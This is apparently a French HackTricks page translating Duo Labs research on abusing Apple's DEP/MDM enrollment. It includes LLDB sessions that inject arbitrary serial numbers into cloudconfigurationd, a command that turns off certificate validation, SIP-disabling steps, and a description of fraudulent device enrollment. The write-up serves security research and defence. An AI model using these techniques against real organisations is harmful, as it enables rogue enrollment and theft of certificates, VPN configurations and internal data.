<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [PLANS D'ABONNEMENT](https://github.com/sponsors/carlospolop) !

- Découvrez [La famille PEASS](https://opensea.io/collection/the-peass-family), notre collection exclusive de [NFTs](https://opensea.io/collection/the-peass-family)

- Obtenez le [swag officiel PEASS & HackTricks](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Introduction

Comme [**mentionné précédemment**](./#what-is-mdm-mobile-device-management), pour essayer d'inscrire un appareil dans une organisation, **seul un numéro de série appartenant à cette organisation est nécessaire**. Une fois l'appareil inscrit, plusieurs organisations installeront des données sensibles sur le nouvel appareil : des certificats, des applications, des mots de passe WiFi, des configurations VPN [et ainsi de suite](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf).\
Par conséquent, cela pourrait être un point d'entrée dangereux pour les attaquants si le processus d'inscription n'est pas correctement protégé.

**La recherche suivante est tirée de** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

# Inverser le processus

## Binaires impliqués dans DEP et MDM

Au cours de notre recherche, nous avons exploré les éléments suivants :

* **`mdmclient`** : Utilisé par le système d'exploitation pour communiquer avec un serveur MDM. Sur macOS 10.13.3 et antérieurs, il peut également être utilisé pour déclencher une vérification DEP.
* **`profiles`** : Un utilitaire qui peut être utilisé pour installer, supprimer et afficher des profils de configuration sur macOS. Il peut également être utilisé pour déclencher une vérification DEP sur macOS 10.13.4 et plus récent.
* **`cloudconfigurationd`** : Le démon client d'inscription de l'appareil, qui est responsable de la communication avec l'API DEP et de la récupération des profils d'inscription de l'appareil.

Lorsque `mdmclient` ou `profiles` est utilisé pour initier une vérification DEP, les fonctions `CPFetchActivationRecord` et `CPGetActivationRecord` sont utilisées pour récupérer l'_Activation Record_. `CPFetchActivationRecord` délègue le contrôle à `cloudconfigurationd` via [XPC](https://developer.apple.com/documentation/xpc), qui récupère ensuite l'_Activation Record_ depuis l'API DEP.

`CPGetActivationRecord` récupère l'_Activation Record_ depuis le cache, si disponible. Ces fonctions sont définies dans le framework de profils de configuration privé, situé à `/System/Library/PrivateFrameworks/Configuration Profiles.framework`.

## Inverser le protocole Tesla et le schéma Absinthe

Pendant le processus de vérification DEP, `cloudconfigurationd` demande un _Activation Record_ à _iprofiles.apple.com/macProfile_. La charge utile de la demande est un dictionnaire JSON contenant deux paires clé-valeur :
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
Le payload est signé et chiffré en utilisant un schéma interne appelé "Absinthe". Le payload chiffré est ensuite encodé en Base 64 et utilisé comme corps de requête dans une requête HTTP POST à _iprofiles.apple.com/macProfile_.

Dans `cloudconfigurationd`, la récupération de l'_Activation Record_ est gérée par la classe `MCTeslaConfigurationFetcher`. Le flux général de `[MCTeslaConfigurationFetcher enterState:]` est le suivant:
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
Puisque le schéma **Absinthe** semble être utilisé pour authentifier les demandes de service DEP, **l'ingénierie inverse** de ce schéma nous permettrait de faire nos propres demandes authentifiées à l'API DEP. Cependant, cela s'est avéré **chronophage**, principalement en raison du nombre d'étapes impliquées dans l'authentification des demandes. Au lieu de renverser complètement le fonctionnement de ce schéma, nous avons opté pour explorer d'autres méthodes d'insertion de numéros de série arbitraires dans la demande de _Activation Record_.

## MITMing DEP Requests

Nous avons exploré la faisabilité de la mise en proxy des demandes réseau vers _iprofiles.apple.com_ avec [Charles Proxy](https://www.charlesproxy.com). Notre objectif était d'inspecter la charge utile envoyée à _iprofiles.apple.com/macProfile_, puis d'insérer un numéro de série arbitraire et de rejouer la demande. Comme mentionné précédemment, la charge utile soumise à ce point final par `cloudconfigurationd` est au format [JSON](https://www.json.org) et contient deux paires clé-valeur.
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
Étant donné que l'API sur _iprofiles.apple.com_ utilise [Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS), nous avons dû activer la proxy SSL dans Charles pour ce domaine afin de voir le contenu en clair des requêtes SSL.

Cependant, la méthode `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` vérifie la validité du certificat du serveur et interrompt la connexion si la confiance du serveur ne peut pas être vérifiée.
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
Le message d'erreur affiché ci-dessus se trouve dans un fichier binaire _Errors.strings_ avec la clé `CLOUD_CONFIG_SERVER_TRUST_ERROR`, qui se trouve à `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`, ainsi que d'autres messages d'erreur connexes.
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
Le fichier _Errors.strings_ peut être [imprimé dans un format lisible par l'homme](https://duo.com/labs/research/mdm-me-maybe#error\_strings\_output) avec la commande intégrée `plutil`.
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
Après avoir examiné plus en détail la classe `MCTeslaConfigurationFetcher`, il est devenu clair que ce comportement de confiance du serveur peut être contourné en activant l'option de configuration `MCCloudConfigAcceptAnyHTTPSCertificate` sur le domaine de préférence `com.apple.ManagedClient.cloudconfigurationd`.
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
L'option de configuration `MCCloudConfigAcceptAnyHTTPSCertificate` peut être définie avec la commande `defaults`.
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
Avec SSL Proxying activé pour _iprofiles.apple.com_ et `cloudconfigurationd` configuré pour accepter n'importe quel certificat HTTPS, nous avons tenté de faire une attaque de type man-in-the-middle et de rejouer les requêtes dans Charles Proxy.

Cependant, étant donné que la charge utile incluse dans le corps de la requête HTTP POST à _iprofiles.apple.com/macProfile_ est signée et chiffrée avec Absinthe (`NACSign`), **il n'est pas possible de modifier la charge utile JSON en clair pour inclure un numéro de série arbitraire sans avoir également la clé pour la décrypter**. Bien qu'il soit possible d'obtenir la clé car elle reste en mémoire, nous avons plutôt continué à explorer `cloudconfigurationd` avec le débogueur [LLDB](https://lldb.llvm.org).

## Instrumentation des binaires système qui interagissent avec DEP

La dernière méthode que nous avons explorée pour automatiser le processus de soumission de numéros de série arbitraires à _iprofiles.apple.com/macProfile_ était d'instrumenter les binaires natifs qui interagissent directement ou indirectement avec l'API DEP. Cela a impliqué une exploration initiale de `mdmclient`, `profiles` et `cloudconfigurationd` dans [Hopper v4](https://www.hopperapp.com) et [Ida Pro](https://www.hex-rays.com/products/ida/), ainsi que de longues sessions de débogage avec `lldb`.

L'un des avantages de cette méthode par rapport à la modification des binaires et à leur resignature avec notre propre clé est qu'elle contourne certaines des restrictions d'attribution intégrées à macOS qui pourraient autrement nous dissuader.

**Protection de l'intégrité du système**

Pour instrumenter les binaires système (tels que `cloudconfigurationd`) sur macOS, [la protection de l'intégrité du système](https://support.apple.com/en-us/HT204899) (SIP) doit être désactivée. SIP est une technologie de sécurité qui protège les fichiers, dossiers et processus de niveau système contre les manipulations, et est activée par défaut sur OS X 10.11 "El Capitan" et ultérieur. [SIP peut être désactivé](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System\_Integrity\_Protection\_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) en démarrant en mode de récupération et en exécutant la commande suivante dans l'application Terminal, puis en redémarrant :
```
csrutil enable --without debug
```
Il convient de noter, cependant, que SIP est une fonctionnalité de sécurité utile et ne doit pas être désactivée, sauf à des fins de recherche et de test sur des machines non productives. Il est également possible (et recommandé) de le faire sur des machines virtuelles non critiques plutôt que sur le système d'exploitation hôte.

**Instrumentation binaire avec LLDB**

Avec SIP désactivé, nous avons pu avancer dans l'instrumentation des binaires système qui interagissent avec l'API DEP, à savoir le binaire `cloudconfigurationd`. Comme `cloudconfigurationd` nécessite des privilèges élevés pour s'exécuter, nous devons démarrer `lldb` avec `sudo`.
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
Pendant que `lldb` attend, nous pouvons ensuite nous connecter à `cloudconfigurationd` en exécutant `sudo /usr/libexec/mdmclient dep nag` dans une fenêtre de terminal séparée. Une fois connecté, une sortie similaire à celle-ci-dessous sera affichée et les commandes LLDB peuvent être saisies à l'invite.
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**Définition du numéro de série de l'appareil**

L'un des premiers éléments que nous avons recherchés lors de la rétro-ingénierie de `mdmclient` et `cloudconfigurationd` était le code responsable de la récupération du numéro de série du système, car nous savions que le numéro de série était finalement responsable de l'authentification de l'appareil. Notre objectif était de modifier le numéro de série en mémoire après sa récupération à partir de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), et de l'utiliser lorsque `cloudconfigurationd` construit la charge utile `macProfile`.

Bien que `cloudconfigurationd` soit finalement responsable de la communication avec l'API DEP, nous avons également examiné si le numéro de série du système est récupéré ou utilisé directement dans `mdmclient`. Le numéro de série récupéré comme indiqué ci-dessous n'est pas ce qui est envoyé à l'API DEP, mais il a révélé un numéro de série codé en dur qui est utilisé si une option de configuration spécifique est activée.
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
Le numéro de série du système est récupéré à partir de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), sauf si la valeur de retour de `sub_10002000f` est différente de zéro, auquel cas il est défini sur la chaîne statique "2222XXJREUF". En examinant cette fonction, il semble vérifier si le "mode de test de stress du serveur" est activé.
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
Nous avons documenté l'existence du "mode de test de stress du serveur", mais nous ne l'avons pas exploré plus loin, car notre objectif était de modifier le numéro de série présenté à l'API DEP. Au lieu de cela, nous avons testé si la modification du numéro de série pointé par le registre `r14` suffirait à récupérer un _Activation Record_ qui n'était pas destiné à la machine sur laquelle nous testions.

Ensuite, nous avons examiné comment le numéro de série du système est récupéré dans `cloudconfigurationd`.
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
Comme on peut le voir ci-dessus, le numéro de série est récupéré à partir de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) dans `cloudconfigurationd`.

En utilisant `lldb`, nous avons pu modifier le numéro de série récupéré à partir de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) en définissant un point d'arrêt pour `IOServiceGetMatchingService` et en créant une nouvelle variable de chaîne contenant un numéro de série arbitraire et en réécrivant le registre `r14` pour pointer vers l'adresse mémoire de la variable que nous avons créée.
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
Bien que nous ayons réussi à modifier le numéro de série récupéré à partir de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), la charge utile `macProfile` contenait toujours le numéro de série du système, et non celui que nous avons écrit dans le registre `r14`.

**Exploitation : Modification du dictionnaire de demande de profil avant la sérialisation JSON**

Ensuite, nous avons essayé de définir le numéro de série envoyé dans la charge utile `macProfile` d'une manière différente. Cette fois, au lieu de modifier le numéro de série du système récupéré via [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), nous avons essayé de trouver le point le plus proche dans le code où le numéro de série est encore en texte clair avant d'être signé avec Absinthe (`NACSign`). Le meilleur point à examiner semblait être `-[MCTeslaConfigurationFetcher startConfigurationFetch]`, qui effectue approximativement les étapes suivantes :

* Crée un nouvel objet `NSMutableData`
* Appelle `[MCTeslaConfigurationFetcher setConfigurationData:]`, en passant le nouvel objet `NSMutableData`
* Appelle `[MCTeslaConfigurationFetcher profileRequestDictionary]`, qui renvoie un objet `NSDictionary` contenant deux paires clé-valeur :
* `sn` : Le numéro de série du système
* `action` : L'action à distance à effectuer (avec `sn` comme argument)
* Appelle `[NSJSONSerialization dataWithJSONObject:]`, en passant le `NSDictionary` de `profileRequestDictionary`
* Signe la charge utile JSON à l'aide d'Absinthe (`NACSign`)
* Encode en base64 la charge utile JSON signée
* Définit la méthode HTTP sur `POST`
* Définit le corps HTTP sur la charge utile JSON signée en base64
* Définit l'en-tête HTTP `X-Profile-Protocol-Version` sur `1`
* Définit l'en-tête HTTP `User-Agent` sur `ConfigClient-1.0`
* Utilise la méthode `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` pour effectuer la requête HTTP

Nous avons ensuite modifié l'objet `NSDictionary` renvoyé par `profileRequestDictionary` avant d'être converti en JSON. Pour ce faire, un point d'arrêt a été défini sur `dataWithJSONObject` afin de nous rapprocher autant que possible des données non converties. Le point d'arrêt a réussi, et lorsque nous avons imprimé le contenu du registre que nous connaissions grâce à la désassemblage (`rdx`), nous avons obtenu les résultats que nous attendions de voir.
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
Le ci-dessus est une représentation joliment formatée de l'objet `NSDictionary` renvoyé par `[MCTeslaConfigurationFetcher profileRequestDictionary]`. Notre prochain défi était de modifier le `NSDictionary` en mémoire contenant le numéro de série.
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
La liste ci-dessus effectue les actions suivantes :

* Crée un point d'arrêt d'expression régulière pour le sélecteur `dataWithJSONObject`
* Attend que le processus `cloudconfigurationd` démarre, puis s'y attache
* Poursuit l'exécution du programme (car le premier point d'arrêt que nous avons atteint pour `dataWithJSONObject` n'est pas celui appelé sur le `profileRequestDictionary`)
* Crée et affiche (en format hexadécimal en raison de `/x`) le résultat de la création de notre `NSDictionary` arbitraire
* Puisque nous connaissons déjà les noms des clés requises, nous pouvons simplement définir le numéro de série sur l'un de nos choix pour `sn` et laisser `action` inchangé
* L'impression du résultat de la création de ce nouveau `NSDictionary` nous indique que nous avons deux paires clé-valeur à une adresse mémoire spécifique

Notre dernière étape consistait à répéter la même étape d'écriture dans `rdx` l'emplacement mémoire de notre objet `NSDictionary` personnalisé qui contient notre numéro de série choisi :
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
Ceci pointe le registre `rdx` vers notre nouveau `NSDictionary` juste avant qu'il ne soit sérialisé en [JSON](https://www.json.org) et envoyé en `POST` à _iprofiles.apple.com/macProfile_, puis le flux du programme `continue`.

Cette méthode de modification du numéro de série dans le dictionnaire de demande de profil avant sa sérialisation en JSON a fonctionné. Lorsque l'on utilise un numéro de série Apple enregistré DEP connu à la place de (null), le journal de débogage de `ManagedClient` a montré le profil DEP complet pour le dispositif :
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
Avec seulement quelques commandes `lldb`, nous pouvons insérer avec succès un numéro de série arbitraire et obtenir un profil DEP qui inclut diverses données spécifiques à l'organisation, y compris l'URL d'inscription MDM de l'organisation. Comme discuté, cette URL d'inscription pourrait être utilisée pour inscrire un appareil malveillant maintenant que nous connaissons son numéro de série. Les autres données pourraient être utilisées pour l'ingénierie sociale d'une inscription malveillante. Une fois inscrit, l'appareil pourrait recevoir un certain nombre de certificats, de profils, d'applications, de configurations VPN, etc.

## Automatisation de l'instrumentation `cloudconfigurationd` avec Python

Une fois que nous avons eu la preuve de concept initiale démontrant comment récupérer un profil DEP valide en utilisant simplement un numéro de série, nous avons cherché à automatiser ce processus pour montrer comment un attaquant pourrait exploiter cette faiblesse dans l'authentification.

Heureusement, l'API LLDB est disponible en Python via une [interface de script](https://lldb.llvm.org/python-reference.html). Sur les systèmes macOS avec les [outils de ligne de commande Xcode](https://developer.apple.com/download/more/) installés, le module Python `lldb` peut être importé comme suit:
```
import lldb
```
Cela a rendu relativement facile la création d'un script de notre preuve de concept démontrant comment insérer un numéro de série enregistré dans DEP et recevoir en retour un profil DEP valide. Le PoC que nous avons développé prend une liste de numéros de série séparés par des sauts de ligne et les injecte dans le processus `cloudconfigurationd` pour vérifier les profils DEP.

![Paramètres de proxy SSL de Charles.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![Notification DEP.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

## Impact

Il existe plusieurs scénarios dans lesquels le programme d'enregistrement des appareils d'Apple pourrait être utilisé de manière abusive, ce qui pourrait conduire à la divulgation d'informations sensibles sur une organisation. Les deux scénarios les plus évidents impliquent l'obtention d'informations sur l'organisation à laquelle un appareil appartient, qui peuvent être récupérées à partir du profil DEP. Le deuxième consiste à utiliser ces informations pour effectuer un enregistrement DEP et MDM frauduleux. Chacun de ces scénarios est discuté plus en détail ci-dessous.

### Divulgation d'informations

Comme mentionné précédemment, une partie du processus d'enregistrement DEP consiste à demander et recevoir un _Activation Record_ (ou profil DEP) à partir de l'API DEP. En fournissant un numéro de série système enregistré dans DEP valide, nous sommes en mesure de récupérer les informations suivantes (soit imprimées sur `stdout`, soit écrites dans le journal `ManagedClient`, selon la version de macOS).
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
Bien que certaines de ces informations puissent être disponibles publiquement pour certaines organisations, avoir un numéro de série d'un appareil appartenant à l'organisation ainsi que les informations obtenues à partir du profil DEP pourrait être utilisé contre le service d'assistance ou l'équipe informatique de l'organisation pour effectuer toute une série d'attaques d'ingénierie sociale, telles que la demande de réinitialisation de mot de passe ou l'aide à l'inscription d'un appareil dans le serveur MDM de l'entreprise.

### Inscription DEP frauduleuse

Le protocole MDM d'Apple prend en charge - mais n'exige pas - l'authentification de l'utilisateur avant l'inscription MDM via l'authentification de base HTTP. **Sans authentification, tout ce qui est nécessaire pour inscrire un appareil dans un serveur MDM via DEP est un numéro de série DEP valide**. Ainsi, un attaquant qui obtient un tel numéro de série (soit par OSINT, ingénierie sociale ou par force brute) pourra inscrire un appareil qui lui appartient comme s'il appartenait à l'organisation, tant qu'il n'est pas actuellement inscrit dans le serveur MDM. Essentiellement, si un attaquant est capable de remporter la course en initiant l'inscription DEP avant le vrai appareil, il est capable d'assumer l'identité de cet appareil.

Les organisations peuvent - et le font - utiliser MDM pour déployer des informations sensibles telles que des certificats d'appareil et d'utilisateur, des données de configuration VPN, des agents d'inscription, des profils de configuration et diverses autres données internes et secrets organisationnels. De plus, certaines organisations choisissent de ne pas exiger l'authentification de l'utilisateur dans le cadre de l'inscription MDM. Cela présente divers avantages, tels qu'une meilleure expérience utilisateur et le fait de ne pas avoir à exposer le serveur d'authentification interne au serveur MDM pour gérer les inscriptions MDM qui ont lieu en dehors du réseau d'entreprise.

Cela pose un problème lors de l'utilisation de DEP pour amorcer l'inscription MDM, car un attaquant serait en mesure d'inscrire n'importe quel point final de son choix dans le serveur MDM de l'organisation. De plus, une fois qu'un attaquant a réussi à inscrire un point final de son choix dans MDM, il peut obtenir un accès privilégié qui pourrait être utilisé pour pivoter davantage dans le réseau.
